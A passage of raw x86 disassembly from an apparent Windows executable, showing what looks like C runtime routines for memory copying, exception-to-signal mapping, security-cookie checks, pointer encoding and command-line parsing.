  403ded:	0f 82 51 01 00 00    	jb     0x403f44
  403df3:	0f ba 25 10 40 41 00 	btl    $0x1,0x414010
  403dfa:	01 
  403dfb:	0f 82 94 00 00 00    	jb     0x403e95
  403e01:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403e07:	74 14                	je     0x403e1d
  403e09:	8b d7                	mov    %edi,%edx
  403e0b:	83 e2 03             	and    $0x3,%edx
  403e0e:	2b ca                	sub    %edx,%ecx
  403e10:	8a 46 ff             	mov    -0x1(%esi),%al
  403e13:	88 47 ff             	mov    %al,-0x1(%edi)
  403e16:	4e                   	dec    %esi
  403e17:	4f                   	dec    %edi
  403e18:	83 ea 01             	sub    $0x1,%edx
  403e1b:	75 f3                	jne    0x403e10
  403e1d:	83 f9 20             	cmp    $0x20,%ecx
  403e20:	0f 82 1e 01 00 00    	jb     0x403f44
  403e26:	8b d1                	mov    %ecx,%edx
  403e28:	c1 e9 02             	shr    $0x2,%ecx
  403e2b:	83 e2 03             	and    $0x3,%edx
  403e2e:	83 ee 04             	sub    $0x4,%esi
  403e31:	83 ef 04             	sub    $0x4,%edi
  403e34:	fd                   	std
  403e35:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403e37:	fc                   	cld
  403e38:	ff 24 95 40 3e 40 00 	jmp    *0x403e40(,%edx,4)
  403e3f:	90                   	nop
  403e40:	50                   	push   %eax
  403e41:	3e 40                	ds inc %eax
  403e43:	00 58 3e             	add    %bl,0x3e(%eax)
  403e46:	40                   	inc    %eax
  403e47:	00 68 3e             	add    %ch,0x3e(%eax)
  403e4a:	40                   	inc    %eax
  403e4b:	00 7c 3e 40          	add    %bh,0x40(%esi,%edi,1)
  403e4f:	00 8b 44 24 0c 5e    	add    %cl,0x5e0c2444(%ebx)
  403e55:	5f                   	pop    %edi
  403e56:	c3                   	ret
  403e57:	90                   	nop
  403e58:	8a 46 03             	mov    0x3(%esi),%al
  403e5b:	88 47 03             	mov    %al,0x3(%edi)
  403e5e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403e62:	5e                   	pop    %esi
  403e63:	5f                   	pop    %edi
  403e64:	c3                   	ret
  403e65:	8d 49 00             	lea    0x0(%ecx),%ecx
  403e68:	8a 46 03             	mov    0x3(%esi),%al
  403e6b:	88 47 03             	mov    %al,0x3(%edi)
  403e6e:	8a 46 02             	mov    0x2(%esi),%al
  403e71:	88 47 02             	mov    %al,0x2(%edi)
  403e74:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403e78:	5e                   	pop    %esi
  403e79:	5f                   	pop    %edi
  403e7a:	c3                   	ret
  403e7b:	90                   	nop
  403e7c:	8a 46 03             	mov    0x3(%esi),%al
  403e7f:	88 47 03             	mov    %al,0x3(%edi)
  403e82:	8a 46 02             	mov    0x2(%esi),%al
  403e85:	88 47 02             	mov    %al,0x2(%edi)
  403e88:	8a 46 01             	mov    0x1(%esi),%al
  403e8b:	88 47 01             	mov    %al,0x1(%edi)
  403e8e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403e92:	5e                   	pop    %esi
  403e93:	5f                   	pop    %edi
  403e94:	c3                   	ret
  403e95:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  403e9b:	74 0f                	je     0x403eac
  403e9d:	49                   	dec    %ecx
  403e9e:	4e                   	dec    %esi
  403e9f:	4f                   	dec    %edi
  403ea0:	8a 06                	mov    (%esi),%al
  403ea2:	88 07                	mov    %al,(%edi)
  403ea4:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  403eaa:	75 f1                	jne    0x403e9d
  403eac:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  403eb2:	72 68                	jb     0x403f1c
  403eb4:	81 ee 80 00 00 00    	sub    $0x80,%esi
  403eba:	81 ef 80 00 00 00    	sub    $0x80,%edi
  403ec0:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  403ec4:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  403ec9:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
  403ece:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
  403ed3:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
  403ed8:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
  403edd:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
  403ee2:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
  403ee7:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  403eeb:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  403ef0:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
  403ef5:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
  403efa:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
  403eff:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
  403f04:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
  403f09:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
  403f0e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  403f14:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
  403f1a:	75 90                	jne    0x403eac
  403f1c:	83 f9 20             	cmp    $0x20,%ecx
  403f1f:	72 23                	jb     0x403f44
  403f21:	83 ee 20             	sub    $0x20,%esi
  403f24:	83 ef 20             	sub    $0x20,%edi
  403f27:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  403f2b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  403f30:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  403f34:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  403f39:	83 e9 20             	sub    $0x20,%ecx
  403f3c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  403f42:	75 dd                	jne    0x403f21
  403f44:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  403f4a:	74 15                	je     0x403f61
  403f4c:	83 ef 04             	sub    $0x4,%edi
  403f4f:	83 ee 04             	sub    $0x4,%esi
  403f52:	8b 06                	mov    (%esi),%eax
  403f54:	89 07                	mov    %eax,(%edi)
  403f56:	83 e9 04             	sub    $0x4,%ecx
  403f59:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  403f5f:	75 eb                	jne    0x403f4c
  403f61:	85 c9                	test   %ecx,%ecx
  403f63:	74 0f                	je     0x403f74
  403f65:	83 ef 01             	sub    $0x1,%edi
  403f68:	83 ee 01             	sub    $0x1,%esi
  403f6b:	8a 06                	mov    (%esi),%al
  403f6d:	88 07                	mov    %al,(%edi)
  403f6f:	83 e9 01             	sub    $0x1,%ecx
  403f72:	75 f1                	jne    0x403f65
  403f74:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403f78:	5e                   	pop    %esi
  403f79:	5f                   	pop    %edi
  403f7a:	c3                   	ret
  403f7b:	eb 03                	jmp    0x403f80
  403f7d:	cc                   	int3
  403f7e:	cc                   	int3
  403f7f:	cc                   	int3
  403f80:	8b c6                	mov    %esi,%eax
  403f82:	83 e0 0f             	and    $0xf,%eax
  403f85:	85 c0                	test   %eax,%eax
  403f87:	0f 85 e3 00 00 00    	jne    0x404070
  403f8d:	8b d1                	mov    %ecx,%edx
  403f8f:	83 e1 7f             	and    $0x7f,%ecx
  403f92:	c1 ea 07             	shr    $0x7,%edx
  403f95:	74 66                	je     0x403ffd
  403f97:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403f9e:	8b ff                	mov    %edi,%edi
  403fa0:	66 0f 6f 06          	movdqa (%esi),%xmm0
  403fa4:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  403fa9:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  403fae:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  403fb3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  403fb7:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  403fbc:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  403fc1:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  403fc6:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  403fcb:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  403fd0:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  403fd5:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  403fda:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  403fdf:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  403fe4:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  403fe9:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  403fee:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  403ff4:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  403ffa:	4a                   	dec    %edx
  403ffb:	75 a3                	jne    0x403fa0
  403ffd:	85 c9                	test   %ecx,%ecx
  403fff:	74 5f                	je     0x404060
  404001:	8b d1                	mov    %ecx,%edx
  404003:	c1 ea 05             	shr    $0x5,%edx
  404006:	85 d2                	test   %edx,%edx
  404008:	74 21                	je     0x40402b
  40400a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404010:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  404014:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  404019:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40401d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  404022:	8d 76 20             	lea    0x20(%esi),%esi
  404025:	8d 7f 20             	lea    0x20(%edi),%edi
  404028:	4a                   	dec    %edx
  404029:	75 e5                	jne    0x404010
  40402b:	83 e1 1f             	and    $0x1f,%ecx
  40402e:	74 30                	je     0x404060
  404030:	8b c1                	mov    %ecx,%eax
  404032:	c1 e9 02             	shr    $0x2,%ecx
  404035:	74 0f                	je     0x404046
  404037:	8b 16                	mov    (%esi),%edx
  404039:	89 17                	mov    %edx,(%edi)
  40403b:	83 c7 04             	add    $0x4,%edi
  40403e:	83 c6 04             	add    $0x4,%esi
  404041:	83 e9 01             	sub    $0x1,%ecx
  404044:	75 f1                	jne    0x404037
  404046:	8b c8                	mov    %eax,%ecx
  404048:	83 e1 03             	and    $0x3,%ecx
  40404b:	74 13                	je     0x404060
  40404d:	8a 06                	mov    (%esi),%al
  40404f:	88 07                	mov    %al,(%edi)
  404051:	46                   	inc    %esi
  404052:	47                   	inc    %edi
  404053:	49                   	dec    %ecx
  404054:	75 f7                	jne    0x40404d
  404056:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40405d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404060:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404064:	5e                   	pop    %esi
  404065:	5f                   	pop    %edi
  404066:	c3                   	ret
  404067:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40406e:	8b ff                	mov    %edi,%edi
  404070:	ba 10 00 00 00       	mov    $0x10,%edx
  404075:	2b d0                	sub    %eax,%edx
  404077:	2b ca                	sub    %edx,%ecx
  404079:	51                   	push   %ecx
  40407a:	8b c2                	mov    %edx,%eax
  40407c:	8b c8                	mov    %eax,%ecx
  40407e:	83 e1 03             	and    $0x3,%ecx
  404081:	74 09                	je     0x40408c
  404083:	8a 16                	mov    (%esi),%dl
  404085:	88 17                	mov    %dl,(%edi)
  404087:	46                   	inc    %esi
  404088:	47                   	inc    %edi
  404089:	49                   	dec    %ecx
  40408a:	75 f7                	jne    0x404083
  40408c:	c1 e8 02             	shr    $0x2,%eax
  40408f:	74 0d                	je     0x40409e
  404091:	8b 16                	mov    (%esi),%edx
  404093:	89 17                	mov    %edx,(%edi)
  404095:	8d 76 04             	lea    0x4(%esi),%esi
  404098:	8d 7f 04             	lea    0x4(%edi),%edi
  40409b:	48                   	dec    %eax
  40409c:	75 f3                	jne    0x404091
  40409e:	59                   	pop    %ecx
  40409f:	e9 e9 fe ff ff       	jmp    0x403f8d
  4040a4:	cc                   	int3
  4040a5:	cc                   	int3
  4040a6:	cc                   	int3
  4040a7:	cc                   	int3
  4040a8:	cc                   	int3
  4040a9:	cc                   	int3
  4040aa:	cc                   	int3
  4040ab:	cc                   	int3
  4040ac:	cc                   	int3
  4040ad:	cc                   	int3
  4040ae:	cc                   	int3
  4040af:	cc                   	int3
  4040b0:	53                   	push   %ebx
  4040b1:	51                   	push   %ecx
  4040b2:	bb 30 40 41 00       	mov    $0x414030,%ebx
  4040b7:	e9 0f 00 00 00       	jmp    0x4040cb
  4040bc:	cc                   	int3
  4040bd:	cc                   	int3
  4040be:	cc                   	int3
  4040bf:	cc                   	int3
  4040c0:	53                   	push   %ebx
  4040c1:	51                   	push   %ecx
  4040c2:	bb 30 40 41 00       	mov    $0x414030,%ebx
  4040c7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4040cb:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4040ce:	89 43 04             	mov    %eax,0x4(%ebx)
  4040d1:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  4040d4:	55                   	push   %ebp
  4040d5:	51                   	push   %ecx
  4040d6:	50                   	push   %eax
  4040d7:	58                   	pop    %eax
  4040d8:	59                   	pop    %ecx
  4040d9:	5d                   	pop    %ebp
  4040da:	59                   	pop    %ecx
  4040db:	5b                   	pop    %ebx
  4040dc:	c2 04 00             	ret    $0x4
  4040df:	cc                   	int3
  4040e0:	ff d0                	call   *%eax
  4040e2:	c3                   	ret
  4040e3:	cc                   	int3
  4040e4:	cc                   	int3
  4040e5:	cc                   	int3
  4040e6:	cc                   	int3
  4040e7:	cc                   	int3
  4040e8:	cc                   	int3
  4040e9:	cc                   	int3
  4040ea:	cc                   	int3
  4040eb:	cc                   	int3
  4040ec:	cc                   	int3
  4040ed:	cc                   	int3
  4040ee:	cc                   	int3
  4040ef:	cc                   	int3
  4040f0:	8b ff                	mov    %edi,%edi
  4040f2:	55                   	push   %ebp
  4040f3:	8b ec                	mov    %esp,%ebp
  4040f5:	51                   	push   %ecx
  4040f6:	51                   	push   %ecx
  4040f7:	a1 00 40 41 00       	mov    0x414000,%eax
  4040fc:	33 c5                	xor    %ebp,%eax
  4040fe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404101:	56                   	push   %esi
  404102:	e8 a1 17 00 00       	call   0x4058a8
  404107:	8b f0                	mov    %eax,%esi
  404109:	85 f6                	test   %esi,%esi
  40410b:	0f 84 43 01 00 00    	je     0x404254
  404111:	8b 16                	mov    (%esi),%edx
  404113:	8b ca                	mov    %edx,%ecx
  404115:	53                   	push   %ebx
  404116:	33 db                	xor    %ebx,%ebx
  404118:	57                   	push   %edi
  404119:	8d 82 90 00 00 00    	lea    0x90(%edx),%eax
  40411f:	3b d0                	cmp    %eax,%edx
  404121:	74 0e                	je     0x404131
  404123:	8b 7d 08             	mov    0x8(%ebp),%edi
  404126:	39 39                	cmp    %edi,(%ecx)
  404128:	74 09                	je     0x404133
  40412a:	83 c1 0c             	add    $0xc,%ecx
  40412d:	3b c8                	cmp    %eax,%ecx
  40412f:	75 f5                	jne    0x404126
  404131:	8b cb                	mov    %ebx,%ecx
  404133:	85 c9                	test   %ecx,%ecx
  404135:	74 07                	je     0x40413e
  404137:	8b 79 08             	mov    0x8(%ecx),%edi
  40413a:	85 ff                	test   %edi,%edi
  40413c:	75 07                	jne    0x404145
  40413e:	33 c0                	xor    %eax,%eax
  404140:	e9 0d 01 00 00       	jmp    0x404252
  404145:	83 ff 05             	cmp    $0x5,%edi
  404148:	75 0b                	jne    0x404155
  40414a:	33 c0                	xor    %eax,%eax
  40414c:	89 59 08             	mov    %ebx,0x8(%ecx)
  40414f:	40                   	inc    %eax
  404150:	e9 fd 00 00 00       	jmp    0x404252
  404155:	83 ff 01             	cmp    $0x1,%edi
  404158:	0f 84 f1 00 00 00    	je     0x40424f
  40415e:	8b 46 04             	mov    0x4(%esi),%eax
  404161:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404164:	8b 45 0c             	mov    0xc(%ebp),%eax
  404167:	89 46 04             	mov    %eax,0x4(%esi)
  40416a:	83 79 04 08          	cmpl   $0x8,0x4(%ecx)
  40416e:	0f 85 c4 00 00 00    	jne    0x404238
  404174:	8d 42 24             	lea    0x24(%edx),%eax
  404177:	8d 50 6c             	lea    0x6c(%eax),%edx
  40417a:	eb 06                	jmp    0x404182
  40417c:	89 58 08             	mov    %ebx,0x8(%eax)
  40417f:	83 c0 0c             	add    $0xc,%eax
  404182:	3b c2                	cmp    %edx,%eax
  404184:	75 f6                	jne    0x40417c
  404186:	8b 5e 08             	mov    0x8(%esi),%ebx
  404189:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  40418e:	39 01                	cmp    %eax,(%ecx)
  404190:	77 4f                	ja     0x4041e1
  404192:	74 44                	je     0x4041d8
  404194:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%ecx)
  40419a:	74 33                	je     0x4041cf
  40419c:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%ecx)
  4041a2:	74 22                	je     0x4041c6
  4041a4:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%ecx)
  4041aa:	74 11                	je     0x4041bd
  4041ac:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%ecx)
  4041b2:	75 6f                	jne    0x404223
  4041b4:	c7 46 08 81 00 00 00 	movl   $0x81,0x8(%esi)
  4041bb:	eb 66                	jmp    0x404223
  4041bd:	c7 46 08 86 00 00 00 	movl   $0x86,0x8(%esi)
  4041c4:	eb 5d                	jmp    0x404223
  4041c6:	c7 46 08 83 00 00 00 	movl   $0x83,0x8(%esi)
  4041cd:	eb 54                	jmp    0x404223
  4041cf:	c7 46 08 82 00 00 00 	movl   $0x82,0x8(%esi)
  4041d6:	eb 4b                	jmp    0x404223
  4041d8:	c7 46 08 84 00 00 00 	movl   $0x84,0x8(%esi)
  4041df:	eb 42                	jmp    0x404223
  4041e1:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%ecx)
  4041e7:	74 33                	je     0x40421c
  4041e9:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%ecx)
  4041ef:	74 22                	je     0x404213
  4041f1:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%ecx)
  4041f7:	74 11                	je     0x40420a
  4041f9:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%ecx)
  4041ff:	75 22                	jne    0x404223
  404201:	c7 46 08 8d 00 00 00 	movl   $0x8d,0x8(%esi)
  404208:	eb 19                	jmp    0x404223
  40420a:	c7 46 08 8e 00 00 00 	movl   $0x8e,0x8(%esi)
  404211:	eb 10                	jmp    0x404223
  404213:	c7 46 08 85 00 00 00 	movl   $0x85,0x8(%esi)
  40421a:	eb 07                	jmp    0x404223
  40421c:	c7 46 08 8a 00 00 00 	movl   $0x8a,0x8(%esi)
  404223:	ff 76 08             	push   0x8(%esi)
  404226:	8b cf                	mov    %edi,%ecx
  404228:	6a 08                	push   $0x8
  40422a:	ff 15 3c d1 40 00    	call   *0x40d13c
  404230:	ff d7                	call   *%edi
  404232:	59                   	pop    %ecx
  404233:	89 5e 08             	mov    %ebx,0x8(%esi)
  404236:	eb 10                	jmp    0x404248
  404238:	ff 71 04             	push   0x4(%ecx)
  40423b:	89 59 08             	mov    %ebx,0x8(%ecx)
  40423e:	8b cf                	mov    %edi,%ecx
  404240:	ff 15 3c d1 40 00    	call   *0x40d13c
  404246:	ff d7                	call   *%edi
  404248:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40424b:	59                   	pop    %ecx
  40424c:	89 46 04             	mov    %eax,0x4(%esi)
  40424f:	83 c8 ff             	or     $0xffffffff,%eax
  404252:	5f                   	pop    %edi
  404253:	5b                   	pop    %ebx
  404254:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404257:	33 cd                	xor    %ebp,%ecx
  404259:	5e                   	pop    %esi
  40425a:	e8 ff cf ff ff       	call   0x40125e
  40425f:	8b e5                	mov    %ebp,%esp
  404261:	5d                   	pop    %ebp
  404262:	c3                   	ret
  404263:	a1 e4 4b 41 00       	mov    0x414be4,%eax
  404268:	c3                   	ret
  404269:	8b ff                	mov    %edi,%edi
  40426b:	55                   	push   %ebp
  40426c:	8b ec                	mov    %esp,%ebp
  40426e:	8b 45 08             	mov    0x8(%ebp),%eax
  404271:	a3 e4 4b 41 00       	mov    %eax,0x414be4
  404276:	5d                   	pop    %ebp
  404277:	c3                   	ret
  404278:	8b ff                	mov    %edi,%edi
  40427a:	55                   	push   %ebp
  40427b:	8b ec                	mov    %esp,%ebp
  40427d:	a1 00 40 41 00       	mov    0x414000,%eax
  404282:	83 e0 1f             	and    $0x1f,%eax
  404285:	6a 20                	push   $0x20
  404287:	59                   	pop    %ecx
  404288:	2b c8                	sub    %eax,%ecx
  40428a:	8b 45 08             	mov    0x8(%ebp),%eax
  40428d:	d3 c8                	ror    %cl,%eax
  40428f:	33 05 00 40 41 00    	xor    0x414000,%eax
  404295:	5d                   	pop    %ebp
  404296:	c3                   	ret
  404297:	8b ff                	mov    %edi,%edi
  404299:	55                   	push   %ebp
  40429a:	8b ec                	mov    %esp,%ebp
  40429c:	8d 41 04             	lea    0x4(%ecx),%eax
  40429f:	8b d0                	mov    %eax,%edx
  4042a1:	2b d1                	sub    %ecx,%edx
  4042a3:	83 c2 03             	add    $0x3,%edx
  4042a6:	56                   	push   %esi
  4042a7:	33 f6                	xor    %esi,%esi
  4042a9:	c1 ea 02             	shr    $0x2,%edx
  4042ac:	3b c1                	cmp    %ecx,%eax
  4042ae:	1b c0                	sbb    %eax,%eax
  4042b0:	f7 d0                	not    %eax
  4042b2:	23 c2                	and    %edx,%eax
  4042b4:	74 0d                	je     0x4042c3
  4042b6:	8b 55 08             	mov    0x8(%ebp),%edx
  4042b9:	46                   	inc    %esi
  4042ba:	89 11                	mov    %edx,(%ecx)
  4042bc:	8d 49 04             	lea    0x4(%ecx),%ecx
  4042bf:	3b f0                	cmp    %eax,%esi
  4042c1:	75 f6                	jne    0x4042b9
  4042c3:	5e                   	pop    %esi
  4042c4:	5d                   	pop    %ebp
  4042c5:	c2 04 00             	ret    $0x4
  4042c8:	a1 00 40 41 00       	mov    0x414000,%eax
  4042cd:	8b c8                	mov    %eax,%ecx
  4042cf:	33 05 e8 4b 41 00    	xor    0x414be8,%eax
  4042d5:	83 e1 1f             	and    $0x1f,%ecx
  4042d8:	d3 c8                	ror    %cl,%eax
  4042da:	f7 d8                	neg    %eax
  4042dc:	1b c0                	sbb    %eax,%eax
  4042de:	f7 d8                	neg    %eax
  4042e0:	c3                   	ret
  4042e1:	8b ff                	mov    %edi,%edi
  4042e3:	55                   	push   %ebp
  4042e4:	8b ec                	mov    %esp,%ebp
  4042e6:	ff 75 08             	push   0x8(%ebp)
  4042e9:	b9 e8 4b 41 00       	mov    $0x414be8,%ecx
  4042ee:	e8 a4 ff ff ff       	call   0x404297
  4042f3:	5d                   	pop    %ebp
  4042f4:	c3                   	ret
  4042f5:	8b ff                	mov    %edi,%edi
  4042f7:	55                   	push   %ebp
  4042f8:	8b ec                	mov    %esp,%ebp
  4042fa:	51                   	push   %ecx
  4042fb:	a1 00 40 41 00       	mov    0x414000,%eax
  404300:	33 c5                	xor    %ebp,%eax
  404302:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404305:	56                   	push   %esi
  404306:	8b 35 00 40 41 00    	mov    0x414000,%esi
  40430c:	8b ce                	mov    %esi,%ecx
  40430e:	33 35 e8 4b 41 00    	xor    0x414be8,%esi
  404314:	83 e1 1f             	and    $0x1f,%ecx
  404317:	d3 ce                	ror    %cl,%esi
  404319:	85 f6                	test   %esi,%esi
  40431b:	75 04                	jne    0x404321
  40431d:	33 c0                	xor    %eax,%eax
  40431f:	eb 0e                	jmp    0x40432f
  404321:	ff 75 08             	push   0x8(%ebp)
  404324:	8b ce                	mov    %esi,%ecx
  404326:	ff 15 3c d1 40 00    	call   *0x40d13c
  40432c:	ff d6                	call   *%esi
  40432e:	59                   	pop    %ecx
  40432f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404332:	33 cd                	xor    %ebp,%ecx
  404334:	5e                   	pop    %esi
  404335:	e8 24 cf ff ff       	call   0x40125e
  40433a:	8b e5                	mov    %ebp,%esp
  40433c:	5d                   	pop    %ebp
  40433d:	c3                   	ret
  40433e:	8b ff                	mov    %edi,%edi
  404340:	55                   	push   %ebp
  404341:	8b ec                	mov    %esp,%ebp
  404343:	ff 75 08             	push   0x8(%ebp)
  404346:	e8 2d ff ff ff       	call   0x404278
  40434b:	59                   	pop    %ecx
  40434c:	a3 e8 4b 41 00       	mov    %eax,0x414be8
  404351:	5d                   	pop    %ebp
  404352:	c3                   	ret
  404353:	8b ff                	mov    %edi,%edi
  404355:	55                   	push   %ebp
  404356:	8b ec                	mov    %esp,%ebp
  404358:	83 ec 0c             	sub    $0xc,%esp
  40435b:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40435f:	56                   	push   %esi
  404360:	74 1c                	je     0x40437e
  404362:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  404366:	74 16                	je     0x40437e
  404368:	e8 8c 18 00 00       	call   0x405bf9
  40436d:	6a 16                	push   $0x16
  40436f:	5e                   	pop    %esi
  404370:	89 30                	mov    %esi,(%eax)
  404372:	e8 c6 17 00 00       	call   0x405b3d
  404377:	8b c6                	mov    %esi,%eax
  404379:	e9 f4 00 00 00       	jmp    0x404472
  40437e:	53                   	push   %ebx
  40437f:	57                   	push   %edi
  404380:	e8 a6 22 00 00       	call   0x40662b
  404385:	68 04 01 00 00       	push   $0x104
  40438a:	be f0 4b 41 00       	mov    $0x414bf0,%esi
  40438f:	33 ff                	xor    %edi,%edi
  404391:	56                   	push   %esi
  404392:	57                   	push   %edi
  404393:	ff 15 00 d0 40 00    	call   *0x40d000
  404399:	8b 1d 6c 4d 41 00    	mov    0x414d6c,%ebx
  40439f:	89 35 74 4d 41 00    	mov    %esi,0x414d74
  4043a5:	85 db                	test   %ebx,%ebx
  4043a7:	74 05                	je     0x4043ae
  4043a9:	80 3b 00             	cmpb   $0x0,(%ebx)
  4043ac:	75 02                	jne    0x4043b0
  4043ae:	8b de                	mov    %esi,%ebx
  4043b0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4043b3:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4043b6:	50                   	push   %eax
  4043b7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4043ba:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4043bd:	50                   	push   %eax
  4043be:	57                   	push   %edi
  4043bf:	57                   	push   %edi
  4043c0:	53                   	push   %ebx
  4043c1:	e8 b1 00 00 00       	call   0x404477
  4043c6:	6a 01                	push   $0x1
  4043c8:	ff 75 f4             	push   -0xc(%ebp)
  4043cb:	ff 75 fc             	push   -0x4(%ebp)
  4043ce:	e8 19 02 00 00       	call   0x4045ec
  4043d3:	8b f0                	mov    %eax,%esi
  4043d5:	83 c4 20             	add    $0x20,%esp
  4043d8:	85 f6                	test   %esi,%esi
  4043da:	75 0c                	jne    0x4043e8
  4043dc:	e8 18 18 00 00       	call   0x405bf9
  4043e1:	6a 0c                	push   $0xc
  4043e3:	5f                   	pop    %edi
  4043e4:	89 38                	mov    %edi,(%eax)
  4043e6:	eb 31                	jmp    0x404419
  4043e8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4043eb:	50                   	push   %eax
  4043ec:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4043ef:	50                   	push   %eax
  4043f0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4043f3:	8d 04 86             	lea    (%esi,%eax,4),%eax
  4043f6:	50                   	push   %eax
  4043f7:	56                   	push   %esi
  4043f8:	53                   	push   %ebx
  4043f9:	e8 79 00 00 00       	call   0x404477
  4043fe:	83 c4 14             	add    $0x14,%esp
  404401:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  404405:	75 16                	jne    0x40441d
  404407:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40440a:	48                   	dec    %eax
  40440b:	a3 60 4d 41 00       	mov    %eax,0x414d60
  404410:	8b c6                	mov    %esi,%eax
  404412:	8b f7                	mov    %edi,%esi
  404414:	a3 64 4d 41 00       	mov    %eax,0x414d64
  404419:	8b df                	mov    %edi,%ebx
  40441b:	eb 4a                	jmp    0x404467
  40441d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404420:	89 7d f8             	mov    %edi,-0x8(%ebp)
  404423:	50                   	push   %eax
  404424:	56                   	push   %esi
  404425:	e8 1c 1d 00 00       	call   0x406146
  40442a:	8b d8                	mov    %eax,%ebx
  40442c:	59                   	pop    %ecx
  40442d:	59                   	pop    %ecx
  40442e:	85 db                	test   %ebx,%ebx
  404430:	74 05                	je     0x404437
  404432:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404435:	eb 26                	jmp    0x40445d
  404437:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40443a:	8b cf                	mov    %edi,%ecx
  40443c:	8b c2                	mov    %edx,%eax
  40443e:	39 3a                	cmp    %edi,(%edx)
  404440:	74 08                	je     0x40444a
  404442:	8d 40 04             	lea    0x4(%eax),%eax
  404445:	41                   	inc    %ecx
  404446:	39 38                	cmp    %edi,(%eax)
  404448:	75 f8                	jne    0x404442
  40444a:	8b c7                	mov    %edi,%eax
  40444c:	89 0d 60 4d 41 00    	mov    %ecx,0x414d60
  404452:	89 45 f8             	mov    %eax,-0x8(%ebp)
